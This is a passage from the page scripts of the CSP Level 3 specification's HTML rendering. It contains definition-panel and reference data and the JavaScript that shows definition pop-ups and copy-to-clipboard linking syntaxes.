type?\n  "},{"refs":[{"id":"ref-for-source-lists\u2461\u2460"}],"title":"6.6.3.3. \n    Does element match source list for type and source?\n  "}],"url":"#source-lists"},
"style-src": {"dfnID":"style-src","dfnText":"style-src","external":false,"refSections":[{"refs":[{"id":"ref-for-style-src"}],"title":"7.4. CSS Parsing"},{"refs":[{"id":"ref-for-style-src\u2460"}],"title":"10.1. \n    Directive Registry\n  "}],"url":"#style-src"},
"style-src-attr": {"dfnID":"style-src-attr","dfnText":"style-src-attr","external":false,"refSections":[{"refs":[{"id":"ref-for-style-src-attr"},{"id":"ref-for-style-src-attr\u2460"}],"title":"6.1.3. default-src"},{"refs":[{"id":"ref-for-style-src-attr\u2461"}],"title":"10.1. \n    Directive Registry\n  "}],"url":"#style-src-attr"},
"style-src-elem": {"dfnID":"style-src-elem","dfnText":"style-src-elem","external":false,"refSections":[{"refs":[{"id":"ref-for-style-src-elem"},{"id":"ref-for-style-src-elem\u2460"}],"title":"6.1.3. default-src"},{"refs":[{"id":"ref-for-style-src-elem\u2461"}],"title":"10.1. \n    Directive Registry\n  "}],"url":"#style-src-elem"},
"violation": {"dfnID":"violation","dfnText":"violation","external":false,"refSections":[{"refs":[{"id":"ref-for-violation"},{"id":"ref-for-violation\u2460"},{"id":"ref-for-violation\u2461"},{"id":"ref-for-violation\u2462"},{"id":"ref-for-violation\u2463"},{"id":"ref-for-violation\u2464"},{"id":"ref-for-violation\u2465"},{"id":"ref-for-violation\u2466"},{"id":"ref-for-violation\u2467"},{"id":"ref-for-violation\u2468"},{"id":"ref-for-violation\u2460\u24ea"},{"id":"ref-for-violation\u2460\u2460"},{"id":"ref-for-violation\u2460\u2461"},{"id":"ref-for-violation\u2460\u2462"}],"title":"2.4. Violations"},{"refs":[{"id":"ref-for-violation\u2460\u2463"},{"id":"ref-for-violation\u2460\u2464"}],"title":"2.4.1. \n    Create a violation object for global, policy, and directive\n  "},{"refs":[{"id":"ref-for-violation\u2460\u2465"}],"title":"2.4.2. \n    Create a violation object for request, and policy.\n  "},{"refs":[{"id":"ref-for-violation\u2460\u2466"}],"title":"5.2. \n    Obtain the deprecated serialization of violation\n  "},{"refs":[{"id":"ref-for-violation\u2460\u2467"}],"title":"5.3. \n    Report a violation\n  "},{"refs":[{"id":"ref-for-violation\u2460\u2468"}],"title":"6.4. \n    Reporting Directives\n  "}],"url":"#violation"},
"violation-column-number": {"dfnID":"violation-column-number","dfnText":"column number","external":false,"refSections":[{"refs":[{"id":"ref-for-violation-column-number"}],"title":"2.4.1. \n    Create a violation object for global, policy, and directive\n  "},{"refs":[{"id":"ref-for-violation-column-number\u2460"},{"id":"ref-for-violation-column-number\u2461"}],"title":"5.2. \n    Obtain the deprecated serialization of violation\n  "},{"refs":[{"id":"ref-for-violation-column-number\u2462"},{"id":"ref-for-violation-column-number\u2463"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#violation-column-number"},
"violation-disposition": {"dfnID":"violation-disposition","dfnText":"disposition","external":false,"refSections":[{"refs":[{"id":"ref-for-violation-disposition"},{"id":"ref-for-violation-disposition\u2460"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#violation-disposition"},
"violation-effective-directive": {"dfnID":"violation-effective-directive","dfnText":"effective directive","external":false,"refSections":[{"refs":[{"id":"ref-for-violation-effective-directive"}],"title":"2.4.1. \n    Create a violation object for global, policy, and directive\n  "},{"refs":[{"id":"ref-for-violation-effective-directive\u2460"}],"title":"5.2. \n    Obtain the deprecated serialization of violation\n  "},{"refs":[{"id":"ref-for-violation-effective-directive\u2461"},{"id":"ref-for-violation-effective-directive\u2462"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#violation-effective-directive"},
"violation-element": {"dfnID":"violation-element","dfnText":"element","external":false,"refSections":[{"refs":[{"id":"ref-for-violation-element"}],"title":"4.2.4. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-violation-element\u2460"},{"id":"ref-for-violation-element\u2461"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#violation-element"},
"violation-global-object": {"dfnID":"violation-global-object","dfnText":"global object","external":false,"refSections":[{"refs":[{"id":"ref-for-violation-global-object"}],"title":"2.4. Violations"},{"refs":[{"id":"ref-for-violation-global-object\u2460"},{"id":"ref-for-violation-global-object\u2461"}],"title":"2.4.1. \n    Create a violation object for global, policy, and directive\n  "},{"refs":[{"id":"ref-for-violation-global-object\u2462"},{"id":"ref-for-violation-global-object\u2463"},{"id":"ref-for-violation-global-object\u2464"},{"id":"ref-for-violation-global-object\u2465"},{"id":"ref-for-violation-global-object\u2466"},{"id":"ref-for-violation-global-object\u2467"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#violation-global-object"},
"violation-line-number": {"dfnID":"violation-line-number","dfnText":"line number","external":false,"refSections":[{"refs":[{"id":"ref-for-violation-line-number"}],"title":"2.4.1. \n    Create a violation object for global, policy, and directive\n  "},{"refs":[{"id":"ref-for-violation-line-number\u2460"},{"id":"ref-for-violation-line-number\u2461"}],"title":"5.2. \n    Obtain the deprecated serialization of violation\n  "},{"refs":[{"id":"ref-for-violation-line-number\u2462"},{"id":"ref-for-violation-line-number\u2463"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#violation-line-number"},
"violation-policy": {"dfnID":"violation-policy","dfnText":"policy","external":false,"refSections":[{"refs":[{"id":"ref-for-violation-policy"}],"title":"2.4.1. \n    Create a violation object for global, policy, and directive\n  "},{"refs":[{"id":"ref-for-violation-policy\u2460"},{"id":"ref-for-violation-policy\u2461"}],"title":"5.2. \n    Obtain the deprecated serialization of violation\n  "},{"refs":[{"id":"ref-for-violation-policy\u2462"},{"id":"ref-for-violation-policy\u2463"},{"id":"ref-for-violation-policy\u2464"},{"id":"ref-for-violation-policy\u2465"},{"id":"ref-for-violation-policy\u2466"},{"id":"ref-for-violation-policy\u2467"},{"id":"ref-for-violation-policy\u2468"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#violation-policy"},
"violation-referrer": {"dfnID":"violation-referrer","dfnText":"referrer","external":false,"refSections":[{"refs":[{"id":"ref-for-violation-referrer"}],"title":"2.4.1. \n    Create a violation object for global, policy, and directive\n  "},{"refs":[{"id":"ref-for-violation-referrer\u2460"}],"title":"5.2. \n    Obtain the deprecated serialization of violation\n  "},{"refs":[{"id":"ref-for-violation-referrer\u2461"},{"id":"ref-for-violation-referrer\u2462"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#violation-referrer"},
"violation-resource": {"dfnID":"violation-resource","dfnText":"resource","external":false,"refSections":[{"refs":[{"id":"ref-for-violation-resource"}],"title":"2.4.1. \n    Create a violation object for global, policy, and directive\n  "},{"refs":[{"id":"ref-for-violation-resource\u2460"}],"title":"2.4.2. \n    Create a violation object for request, and policy.\n  "},{"refs":[{"id":"ref-for-violation-resource\u2461"}],"title":"4.2.4. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-violation-resource\u2462"},{"id":"ref-for-violation-resource\u2463"}],"title":"4.2.5. \n    Should navigation request of type be blocked\n    by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-violation-resource\u2464"},{"id":"ref-for-violation-resource\u2465"}],"title":"4.2.6. \n    Should navigation response to navigation request of type\n    in target be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-violation-resource\u2466"}],"title":"4.3.1. \n    EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source)\n  "},{"refs":[{"id":"ref-for-violation-resource\u2467"}],"title":"5.2. \n    Obtain the deprecated serialization of violation\n  "},{"refs":[{"id":"ref-for-violation-resource\u2468"},{"id":"ref-for-violation-resource\u2460\u24ea"}],"title":"5.3. \n    Report a violation\n  "},{"refs":[{"id":"ref-for-violation-resource\u2460\u2460"}],"title":"6.2.1.1. \n    Is base allowed for document?\n  "}],"url":"#violation-resource"},
"violation-sample": {"dfnID":"violation-sample","dfnText":"sample","external":false,"refSections":[{"refs":[{"id":"ref-for-violation-sample"}],"title":"1.3. Changes from Level 2"},{"refs":[{"id":"ref-for-violation-sample\u2460"}],"title":"2.4. Violations"},{"refs":[{"id":"ref-for-violation-sample\u2461"}],"title":"4.2.4. \n    Should element\u2019s inline type behavior be blocked by Content Security Policy?\n  "},{"refs":[{"id":"ref-for-violation-sample\u2462"}],"title":"4.3.1. \n    EnsureCSPDoesNotBlockStringCompilation(callerRealm, calleeRealm, source)\n  "},{"refs":[{"id":"ref-for-violation-sample\u2463"}],"title":"5.2. \n    Obtain the deprecated serialization of violation\n  "},{"refs":[{"id":"ref-for-violation-sample\u2464"},{"id":"ref-for-violation-sample\u2465"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#violation-sample"},
"violation-source-file": {"dfnID":"violation-source-file","dfnText":"source file","external":false,"refSections":[{"refs":[{"id":"ref-for-violation-source-file"},{"id":"ref-for-violation-source-file\u2460"}],"title":"2.4.1. \n    Create a violation object for global, policy, and directive\n  "},{"refs":[{"id":"ref-for-violation-source-file\u2461"},{"id":"ref-for-violation-source-file\u2462"}],"title":"5.2. \n    Obtain the deprecated serialization of violation\n  "},{"refs":[{"id":"ref-for-violation-source-file\u2463"},{"id":"ref-for-violation-source-file\u2464"},{"id":"ref-for-violation-source-file\u2465"},{"id":"ref-for-violation-source-file\u2466"},{"id":"ref-for-violation-source-file\u2467"},{"id":"ref-for-violation-source-file\u2468"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#violation-source-file"},
"violation-status": {"dfnID":"violation-status","dfnText":"status","external":false,"refSections":[{"refs":[{"id":"ref-for-violation-status"}],"title":"2.4.1. \n    Create a violation object for global, policy, and directive\n  "},{"refs":[{"id":"ref-for-violation-status\u2460"}],"title":"5.2. \n    Obtain the deprecated serialization of violation\n  "},{"refs":[{"id":"ref-for-violation-status\u2461"},{"id":"ref-for-violation-status\u2462"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#violation-status"},
"violation-url": {"dfnID":"violation-url","dfnText":"url","external":false,"refSections":[{"refs":[{"id":"ref-for-violation-url"}],"title":"5.2. \n    Obtain the deprecated serialization of violation\n  "},{"refs":[{"id":"ref-for-violation-url\u2460"},{"id":"ref-for-violation-url\u2461"},{"id":"ref-for-violation-url\u2462"},{"id":"ref-for-violation-url\u2463"}],"title":"5.3. \n    Report a violation\n  "}],"url":"#violation-url"},
"worker-src": {"dfnID":"worker-src","dfnText":"worker-src","external":false,"refSections":[{"refs":[{"id":"ref-for-worker-src"},{"id":"ref-for-worker-src\u2460"}],"title":"6.1.3. default-src"},{"refs":[{"id":"ref-for-worker-src\u2461"}],"title":"6.1.11. script-src"},{"refs":[{"id":"ref-for-worker-src\u2462"}],"title":"6.1.17. worker-src"},{"refs":[{"id":"ref-for-worker-src\u2463"}],"title":"10.1. \n    Directive Registry\n  "}],"url":"#worker-src"},
};

document.addEventListener("DOMContentLoaded", ()=>{
    genAllDfnPanels();

    document.body.addEventListener("click", (e) => {
        // If not handled already, just hide all dfn panels.
        hideAllDfnPanels();
    });
});

window.addEventListener("resize", () => {
    // Pin any visible dfn panel
    queryAll(".dfn-panel.on, .dfn-panel.activated").forEach(el=>positionDfnPanel(el));
});

function genAllDfnPanels() {
    for(const panelData of Object.values(dfnPanelData)) {
        const dfnID = panelData.dfnID;
        const dfn = document.getElementById(dfnID);
        if(!dfn) {
            console.log(`Can't find dfn#${dfnID}.`, panelData);
            continue;
        }
        dfn.panelData = panelData;
        insertDfnPopupAction(dfn);
    }
}

function genDfnPanel(dfn, { dfnID, url, dfnText, refSections, external }) {
    const dfnPanel = mk.aside({
        class: "dfn-panel on",
        id: `infopanel-for-${dfnID}`,
        "data-for": dfnID,
        "aria-labelled-by":`infopaneltitle-for-${dfnID}`,
        },
        mk.span({id:`infopaneltitle-for-${dfnID}`, style:"display:none"},
            `Info about the '${dfnText}' ${external?"external":""} reference.`),
        mk.a({href:url, class:"dfn-link"}, url),
        refSections.length == 0 ? [] :
            mk.b({}, "Referenced in:"),
            mk.ul({},
                ...refSections.map(section=>
                    mk.li({},
                        ...section.refs.map((ref, refI)=>
                            [
                                mk.a({ href: `#${ref.id}` },
                                    (refI == 0) ? section.title : `(${refI + 1})`
                                ),
                                " ",
                            ]
                        ),
                    ),
                ),
            ),
        genLinkingSyntaxes(dfn),
    );

    dfnPanel.addEventListener('click', (event) => {
        if (event.target.nodeName == 'A') {
            scrollToTargetAndHighlight(event);
            pinDfnPanel(dfnPanel);
        }
        event.stopPropagation();
        refocusOnTarget(event);
    });
    dfnPanel.addEventListener('keydown', (event) => {
        if(event.keyCode == 27) { // Escape key
            hideDfnPanel({dfnPanel});
            event.stopPropagation();
            event.preventDefault();
        }
    });

    dfnPanel.dfn = dfn;
    dfn.dfnPanel = dfnPanel;
    return dfnPanel;
}



function hideAllDfnPanels() {
    // Delete the currently-active dfn panel.
    queryAll(".dfn-panel").forEach(dfnPanel=>hideDfnPanel({dfnPanel}));
}

function showDfnPanel(dfn) {
    hideAllDfnPanels(); // Only display one at a time.

    dfn.setAttribute("aria-expanded", "true");

    const dfnPanel = genDfnPanel(dfn, dfn.panelData);

    // Give the dfn a unique tabindex, and then
    // give all the tabbable panel bits successive indexes.
    let tabIndex = 100;
    dfn.tabIndex = tabIndex++;
    const tabbable = dfnPanel.querySelectorAll(":is(a, button)");
    for (const el of tabbable) {
        el.tabIndex = tabIndex++;
    }

    append(document.body, dfnPanel);
    positionDfnPanel(dfnPanel);
}

function positionDfnPanel(dfnPanel) {
    const dfn = dfnPanel.dfn;
    const dfnPos = getBounds(dfn);
    dfnPanel.style.top = dfnPos.bottom + "px";
    dfnPanel.style.left = dfnPos.left + "px";

    const panelPos = dfnPanel.getBoundingClientRect();
    const panelMargin = 8;
    const maxRight = document.body.parentNode.clientWidth - panelMargin;
    if (panelPos.right > maxRight) {
        const overflowAmount = panelPos.right - maxRight;
        const newLeft = Math.max(panelMargin, dfnPos.left - overflowAmount);
        dfnPanel.style.left = newLeft + "px";
    }
}

function pinDfnPanel(dfnPanel) {
    // Switch it to "activated" state, which pins it.
    dfnPanel.classList.add("activated");
    dfnPanel.style.position = "fixed";
    dfnPanel.style.left = null;
    dfnPanel.style.top = null;
}

function hideDfnPanel({dfn, dfnPanel}) {
    if(!dfnPanel) dfnPanel = dfn.dfnPanel;
    if(!dfn) dfn = dfnPanel.dfn;
    dfn.dfnPanel = undefined;
    dfnPanel.dfn = undefined;
    dfn.setAttribute("aria-expanded", "false");
    dfn.tabIndex = undefined;
    dfnPanel.remove()
}

function toggleDfnPanel(dfn) {
    if(dfn.dfnPanel) {
        hideDfnPanel(dfn);
    } else {
        showDfnPanel(dfn);
    }
}

function insertDfnPopupAction(dfn) {
    dfn.setAttribute('role', 'button');
    dfn.setAttribute('aria-expanded', 'false')
    dfn.tabIndex = 0;
    dfn.classList.add('has-dfn-panel');
    dfn.addEventListener('click', (event) => {
        toggleDfnPanel(dfn);
        event.stopPropagation();
    });
    dfn.addEventListener('keypress', (event) => {
        const kc = event.keyCode;
        // 32->Space, 13->Enter
        if(kc == 32 || kc == 13) {
            toggleDfnPanel(dfn);
            event.stopPropagation();
            event.preventDefault();
        }
    });
}

function refocusOnTarget(event) {
    const target = event.target;
    setTimeout(() => {
        // Refocus on the event.target element.
        // This is needed after browser scrolls to the destination.
        target.focus();
    });
}

// TODO: shared util
// Returns the root-level absolute position {left and top} of element.
function getBounds(el, relativeTo=document.body) {
    const relativeRect = relativeTo.getBoundingClientRect();
    const elRect = el.getBoundingClientRect();
    const top = elRect.top - relativeRect.top;
    const left = elRect.left - relativeRect.left;
    return {
        top,
        left,
        bottom: top + elRect.height,
        right: left + elRect.width,
    }
}

function scrollToTargetAndHighlight(event) {
    let hash = event.target.hash;
    if (hash) {
        hash = decodeURIComponent(hash.substring(1));
        const dest = document.getElementById(hash);
        if (dest) {
            dest.classList.add('highlighted');
            setTimeout(() => dest.classList.remove('highlighted'), 1000);
        }
    }
}

// Functions, divided by link type, that wrap an autolink's
// contents with the appropriate outer syntax.
// Alternately, a string naming another type they format
// the same as.
function needsFor(type) {
    switch(type) {
        case "descriptor":
        case "value":
        case "element-attr":
        case "attr-value":
        case "element-state":
        case "method":
        case "constructor":
        case "argument":
        case "attribute":
        case "const":
        case "dict-member":
        case "event":
        case "enum-value":
        case "stringifier":
        case "serializer":
        case "iterator":
        case "maplike":
        case "setlike":
        case "state":
        case "mode":
        case "context":
        case "facet": return true;

        default: return false;
    }
}
function refusesFor(type) {
    switch(type) {
        case "property":
        case "element":
        case "interface":
        case "namespace":
        case "callback":
        case "dictionary":
        case "enum":
        case "exception":
        case "typedef":
        case "http-header":
        case "permission": return true;

        default: return false;
    }
}
function linkFormatterFromType(type) {
    switch(type) {
        case 'scheme':
        case 'permission':
        case 'dfn': return (text) => `[=${text}=]`;

        case 'abstract-op': return (text) => `[\$${text}\$]`;

        case 'function':
        case 'at-rule':
        case 'selector':
        case 'value': return (text) => `''${text}''`;

        case 'http-header': return (text) => `[:${text}:]`;

        case 'interface':
        case 'constructor':
        case 'method':
        case 'argument':
        case 'attribute':
        case 'callback':
        case 'dictionary':
        case 'dict-member':
        case 'enum':
        case 'enum-value':
        case 'exception':
        case 'const':
        case 'typedef':
        case 'stringifier':
        case 'serializer':
        case 'iterator':
        case 'maplike':
        case 'setlike':
        case 'extended-attribute':
        case 'event':
        case 'idl': return (text) => `{{${text}}}`;

        case 'element-state':
        case 'element-attr':
        case 'attr-value':
        case 'element': return (element) => `<{${element}}>`;

        case 'grammar': return (text) => `${text} (within a <pre class=prod>)`;

        case 'type': return (text)=> `<<${text}>>`;

        case 'descriptor':
        case 'property': return (text) => `'${text}'`;

        default: return;
    };
};

function genLinkingSyntaxes(dfn) {
    if(dfn.tagName != "DFN") return;

    const type = dfn.getAttribute('data-dfn-type');
    if(!type) {
        console.log(`<dfn> doesn't have a data-dfn-type:`, dfn);
        return [];
    }

    // Return a function that wraps link text based on the type
    const linkFormatter = linkFormatterFromType(type);
    if(!linkFormatter) {
        console.log(`<dfn> has an unknown data-dfn-type:`, dfn);
        return [];
    }

    let ltAlts;
    if(dfn.hasAttribute('data-lt')) {
        ltAlts = dfn.getAttribute('data-lt')
            .split("|")
            .map(x=>x.trim());
    } else {
        ltAlts = [dfn.textContent.trim()];
    }
    if(type == "type") {
        // lt of "<foo>", but "foo" is the interior;
        // <<foo/bar>> is how you write it with a for,
        // not <foo/<bar>> or whatever.
        for(var i = 0; i < ltAlts.length; i++) {
            const lt = ltAlts[i];
            const match = /<(.*)>/.exec(lt);
            if(match) { ltAlts[i] = match[1]; }
        }
    }

    let forAlts;
    if(dfn.hasAttribute('data-dfn-for')) {
        forAlts = dfn.getAttribute('data-dfn-for')
            .split(",")
            .map(x=>x.trim());
    } else {
        forAlts = [''];
    }

    let linkingSyntaxes = [];
    if(!needsFor(type)) {
        for(const lt of ltAlts) {
            linkingSyntaxes.push(linkFormatter(lt));
        }
    }
    if(!refusesFor(type)) {
        for(const f of forAlts) {
            linkingSyntaxes.push(linkFormatter(`${f}/${ltAlts[0]}`))
        }
    }
    return [
        mk.b({}, 'Possible linking syntaxes:'),
        mk.ul({},
            ...linkingSyntaxes.map(link => {
                const copyLink = async () =>
                    await navigator.clipboard.writeText(link);
                return mk.li({},
                    mk.div({ class: 'link-item' },
                        mk.button({
                            class: 'copy-icon', title: 'Copy',
                            type: 'button',
                            _onclick: copyLink,
                            tabindex: 0,
                        }, mk.span({ class: 'icon' }) ),
                        mk.span({}, link)
                    )
                );
            })
        )
    ];
}
}
</script>
<script>/* Boilerplate: script-ref-hints */
"use strict";
{
let refsData = {
"#abstract-opdef-parse-a-serialized-csp": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"parse a serialized CSP","type":"abstract-op","url":"#abstract-opdef-parse-a-serialized-csp"},
"#abstract-opdef-parse-a-serialized-csp-list": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"parse a serialized CSP list","type":"abstract-op","url":"#abstract-opdef-parse-a-serialized-csp-list"},
"#base-uri": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"base-uri","type":"dfn","url":"#base-uri"},
"#child-src": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"child-src","type":"dfn","url":"#child-src"},
"#connect-src": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"connect-src","type":"dfn","url":"#connect-src"},
"#content-security-policy": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"content security policy","type":"dfn","url":"#content-security-policy"},
"#content-security-policy-object": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"policy","type":"dfn","url":"#content-security-policy-object"},
"#csp-list": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"csp list","type":"dfn","url":"#csp-list"},
"#csp-violation-report": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"csp violation report","type":"dfn","url":"#csp-violation-report"},
"#cspviolationreportbody": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"CSPViolationReportBody","type":"interface","url":"#cspviolationreportbody"},
"#default-src": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"default-src","type":"dfn","url":"#default-src"},
"#dictdef-securitypolicyviolationeventinit": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"SecurityPolicyViolationEventInit","type":"dictionary","url":"#dictdef-securitypolicyviolationeventinit"},
"#directive-initialization": {"export":true,"for_":["directive"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"initialization","type":"dfn","url":"#directive-initialization"},
"#directive-inline-check": {"export":true,"for_":["directive"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"inline check","type":"dfn","url":"#directive-inline-check"},
"#directive-name": {"export":true,"for_":["directive"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"name","type":"dfn","url":"#directive-name"},
"#directive-navigation-response-check": {"export":true,"for_":["directive"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"navigation response check","type":"dfn","url":"#directive-navigation-response-check"},
"#directive-post-request-check": {"export":true,"for_":["directive"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"post-request check","type":"dfn","url":"#directive-post-request-check"},
"#directive-pre-navigation-check": {"export":true,"for_":["directive"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"pre-navigation check","type":"dfn","url":"#directive-pre-navigation-check"},
"#directive-pre-request-check": {"export":true,"for_":["directive"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"pre-request check","type":"dfn","url":"#directive-pre-request-check"},
"#directive-response-check": {"export":true,"for_":["directive"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"response check","type":"dfn","url":"#directive-response-check"},
"#directive-value": {"export":true,"for_":["directive"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"value","type":"dfn","url":"#directive-value"},
"#directives": {"export":true,"for_":[],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"directives","type":"dfn","url":"#directives"},
"#dom-cspviolationreportbody-blockedurl": {"export":true,"for_":["CSPViolationReportBody"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"blockedURL","type":"attribute","url":"#dom-cspviolationreportbody-blockedurl"},
"#dom-cspviolationreportbody-columnnumber": {"export":true,"for_":["CSPViolationReportBody"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"columnNumber","type":"attribute","url":"#dom-cspviolationreportbody-columnnumber"},
"#dom-cspviolationreportbody-disposition": {"export":true,"for_":["CSPViolationReportBody"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"disposition","type":"attribute","url":"#dom-cspviolationreportbody-disposition"},
"#dom-cspviolationreportbody-documenturl": {"export":true,"for_":["CSPViolationReportBody"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"documentURL","type":"attribute","url":"#dom-cspviolationreportbody-documenturl"},
"#dom-cspviolationreportbody-effectivedirective": {"export":true,"for_":["CSPViolationReportBody"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"effectiveDirective","type":"attribute","url":"#dom-cspviolationreportbody-effectivedirective"},
"#dom-cspviolationreportbody-linenumber": {"export":true,"for_":["CSPViolationReportBody"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"lineNumber","type":"attribute","url":"#dom-cspviolationreportbody-linenumber"},
"#dom-cspviolationreportbody-originalpolicy": {"export":true,"for_":["CSPViolationReportBody"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"originalPolicy","type":"attribute","url":"#dom-cspviolationreportbody-originalpolicy"},
"#dom-cspviolationreportbody-referrer": {"export":true,"for_":["CSPViolationReportBody"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"referrer","type":"attribute","url":"#dom-cspviolationreportbody-referrer"},
"#dom-cspviolationreportbody-sample": {"export":true,"for_":["CSPViolationReportBody"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"sample","type":"attribute","url":"#dom-cspviolationreportbody-sample"},
"#dom-cspviolationreportbody-sourcefile": {"export":true,"for_":["CSPViolationReportBody"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"sourceFile","type":"attribute","url":"#dom-cspviolationreportbody-sourcefile"},
"#dom-cspviolationreportbody-statuscode": {"export":true,"for_":["CSPViolationReportBody"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"statusCode","type":"attribute","url":"#dom-cspviolationreportbody-statuscode"},
"#dom-securitypolicyviolationevent-blockeduri": {"export":true,"for_":["SecurityPolicyViolationEvent"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"blockedURI","type":"attribute","url":"#dom-securitypolicyviolationevent-blockeduri"},
"#dom-securitypolicyviolationevent-blockedurl": {"export":true,"for_":["SecurityPolicyViolationEvent"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"blockedURL","type":"attribute","url":"#dom-securitypolicyviolationevent-blockedurl"},
"#dom-securitypolicyviolationevent-colno": {"export":true,"for_":["SecurityPolicyViolationEvent"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"colno","type":"attribute","url":"#dom-securitypolicyviolationevent-colno"},
"#dom-securitypolicyviolationevent-columnnumber": {"export":true,"for_":["SecurityPolicyViolationEvent"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"columnNumber","type":"attribute","url":"#dom-securitypolicyviolationevent-columnnumber"},
"#dom-securitypolicyviolationevent-disposition": {"export":true,"for_":["SecurityPolicyViolationEvent"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"disposition","type":"attribute","url":"#dom-securitypolicyviolationevent-disposition"},
"#dom-securitypolicyviolationevent-documenturi": {"export":true,"for_":["SecurityPolicyViolationEvent"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"documentURI","type":"attribute","url":"#dom-securitypolicyviolationevent-documenturi"},
"#dom-securitypolicyviolationevent-documenturl": {"export":true,"for_":["SecurityPolicyViolationEvent"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"documentURL","type":"attribute","url":"#dom-securitypolicyviolationevent-documenturl"},
"#dom-securitypolicyviolationevent-effectivedirective": {"export":true,"for_":["SecurityPolicyViolationEvent"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"effectiveDirective","type":"attribute","url":"#dom-securitypolicyviolationevent-effectivedirective"},
"#dom-securitypolicyviolationevent-lineno": {"export":true,"for_":["SecurityPolicyViolationEvent"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"lineno","type":"attribute","url":"#dom-securitypolicyviolationevent-lineno"},
"#dom-securitypolicyviolationevent-linenumber": {"export":true,"for_":["SecurityPolicyViolationEvent"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"lineNumber","type":"attribute","url":"#dom-securitypolicyviolationevent-linenumber"},
"#dom-securitypolicyviolationevent-originalpolicy": {"export":true,"for_":["SecurityPolicyViolationEvent"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"originalPolicy","type":"attribute","url":"#dom-securitypolicyviolationevent-originalpolicy"},
"#dom-securitypolicyviolationevent-referrer": {"export":true,"for_":["SecurityPolicyViolationEvent"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"referrer","type":"attribute","url":"#dom-securitypolicyviolationevent-referrer"},
"#dom-securitypolicyviolationevent-sample": {"export":true,"for_":["SecurityPolicyViolationEvent"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"sample","type":"attribute","url":"#dom-securitypolicyviolationevent-sample"},
"#dom-securitypolicyviolationevent-sourcefile": {"export":true,"for_":["SecurityPolicyViolationEvent"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"sourceFile","type":"attribute","url":"#dom-securitypolicyviolationevent-sourcefile"},
"#dom-securitypolicyviolationevent-statuscode": {"export":true,"for_":["SecurityPolicyViolationEvent"],"level":"","normative":true,"shortname":"csp3","spec":"csp3","status":"local","text":"statusCode","type":"attribute","url":"#dom-securitypolicyviolationevent-statuscode"},
